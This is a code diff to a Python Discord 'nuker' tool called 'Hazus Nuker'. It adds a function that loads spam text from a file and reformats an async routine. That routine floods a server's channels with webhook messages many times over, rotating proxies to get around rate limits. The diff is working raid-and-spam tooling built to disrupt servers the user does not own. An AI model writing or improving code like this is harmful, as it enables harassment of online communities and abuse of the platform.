@@ -63,28 +63,43 @@ def bot_nuker():
             except Exception as e:
                 await asynccprint (e, 1)
 
+        def read_spam_message():
+            try:
+                with open('spam_message.txt', 'r', encoding='utf-8') as file:
+                    return file.read().strip()
+            except FileNotFoundError:
+                asynccprint("spam_message.txt not found. Using default message.", 2)
+                return spam_message
+
         async def spam_webhook(webhook, channel):
-                for _ in range(message_spam_times):
-                    try:
-                        if use_proxy.strip().lower() == 'y':
-                            proxy = random.choice(proxylist)
-                            proxy = f'http://{proxy}'
-                            async with aiohttp.ClientSession() as session:
-                                async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4, proxy=proxy) as response:
-                                    if 200 <= response.status <= 299:
-                                        await asynccprint(f"Sent message in {channel}", 0)
-                                    else:
-                                        await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
-                        else:
-                            async with aiohttp.ClientSession() as session:
-                                async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4) as response:
-                                    if 200 <= response.status <= 299:
-                                        await asynccprint(f"Sent message in {channel}", 0)
-                                    else:
-                                        await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
-                    except Exception as e:
-                        await asynccprint(f"Failed to send message in {channel}", 1)
-                        await asyncio.sleep(0.5)
+            message_content = read_spam_message()
+            for _ in range(message_spam_times):
+                try:
+                    if use_proxy.strip().lower() == 'y':
+                        proxy = random.choice(proxylist)
+                        proxy = f'http://{proxy}'
+                        async with aiohttp.ClientSession() as session:
+                            async with session.post(webhook,
+                                                    json={"content": message_content, "username": "Hazus Nuker"},
+                                                    headers={"Content-Type": "application/json"}, timeout=4,
+                                                    proxy=proxy) as response:
+                                if 200 <= response.status <= 299:
+                                    await asynccprint(f"Sent message in {channel}", 0)
+                                else:
+                                    await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
+                    else:
+                        async with aiohttp.ClientSession() as session:
+                            async with session.post(webhook,
+                                                    json={"content": message_content, "username": "Hazus Nuker"},
+                                                    headers={"Content-Type": "application/json"},
+                                                    timeout=4) as response:
+                                if 200 <= response.status <= 299:
+                                    await asynccprint(f"Sent message in {channel}", 0)
+                                else:
+                                    await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
+                except Exception as e:
+                    await asynccprint(f"Failed to send message in {channel}", 1)
+                    await asyncio.sleep(0.5)
 
         async def create_webhook(channelid):
             retries = 0
